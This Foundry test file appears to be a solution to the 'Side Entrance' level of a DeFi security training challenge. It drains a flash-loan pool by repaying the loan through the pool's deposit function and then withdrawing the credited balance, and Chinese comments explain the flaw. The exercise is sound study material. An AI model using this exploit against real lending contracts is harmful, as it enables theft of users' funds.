// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";
import {Address} from "openzeppelin-contracts/utils/Address.sol";

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract SideEntrance is Test {
    using Address for address payable;

    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        console.log("init - SideEntrance's ETH: ", address(this).balance);
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;
        console.log("attacker's init balance: ", address(attacker).balance / 1e18);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);
        sideEntranceLenderPool.deposit{value: 1 ether}();
        console.log("after deposit - attacker's balance: ", address(attacker).balance / 1e18);
        console.log(
            "after deposit - sideEntranceLenderPool's balance: ", address(sideEntranceLenderPool).balance / 1e18
        );
        sideEntranceLenderPool.withdraw();
        console.log("after withdraw - attacker's balance: ", address(attacker).balance / 1e18);
        console.log(
            "after withdraw - sideEntranceLenderPool's balance: ", address(sideEntranceLenderPool).balance / 1e18
        );
        vm.stopPrank();
        // 正常的 flash loan - 會回 call 自己寫的合約實作的 execute function (實作將自己的錢存進 flash loan)
        console.log("before flash loan - attacker's ETH: ", attacker.balance);
        console.log("before flash loan - SideEntrance's ETH: ", address(this).balance);
        console.log("before flash loan - sideEntranceLenderPool's ETH: ", address(sideEntranceLenderPool).balance);
        uint256 flashLoadAmount = 1 ether;
        sideEntranceLenderPool.flashLoan(ETHER_IN_POOL);
        console.log("after flash loan - attacker's ETH: ", attacker.balance);
        console.log("after flash loan - SideEntrance's ETH: ", address(this).balance);
        console.log("after flash loan - sideEntranceLenderPool's ETH: ", address(sideEntranceLenderPool).balance);

        // 攻擊合約 - 利用存款漏洞
        console.log("SideEntrance: ", address(this));
        sideEntranceLenderPool.withdraw();
        console.log("after sideEntranceLenderPool withdraw - attacker's ETH: ", attacker.balance);
        console.log("after sideEntranceLenderPool withdraw - SideEntrance's ETH: ", address(this).balance);
        console.log(
            "after sideEntranceLenderPool withdraw - sideEntranceLenderPool's ETH: ",
            address(sideEntranceLenderPool).balance
        );
        // address(this) 將 ETH 轉給 attacker
        attacker.transfer(ETHER_IN_POOL);
        console.log("after attacker transfer - attacker's ETH: ", attacker.balance);
        console.log("after attacker transfer - SideEntrance's ETH: ", address(this).balance);
        console.log("after attacker transfer - sideEntranceLenderPool's ETH: ", address(sideEntranceLenderPool).balance);
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }

    function execute() external payable {
        console.log("before attacker deposit - sideEntranceLenderPool's ETH: ", address(sideEntranceLenderPool).balance);
        // vm.prank(attacker);
        // 利用 value 將 ETH 轉給 sideEntranceLenderPool ，然後 sideEntranceLenderPool 也會利用 balances arry 紀錄此地址存款多少 ETH 。
        // 正常應該是還錢給 sideEntranceLenderPool ，但卻可以利用 deposit 在 sideEntranceLenderPool 帳上紀錄 address(this) 有 ETHER_IN_POOL
        // 所以就可以出金那麼多 ETHER_IN_POOL 但實際上 address(this) 並未花錢存在 sideEntranceLenderPool 而是利用 flash loan 的錢存款。
        sideEntranceLenderPool.deposit{value: ETHER_IN_POOL}();
    }

    receive() external payable {}
}
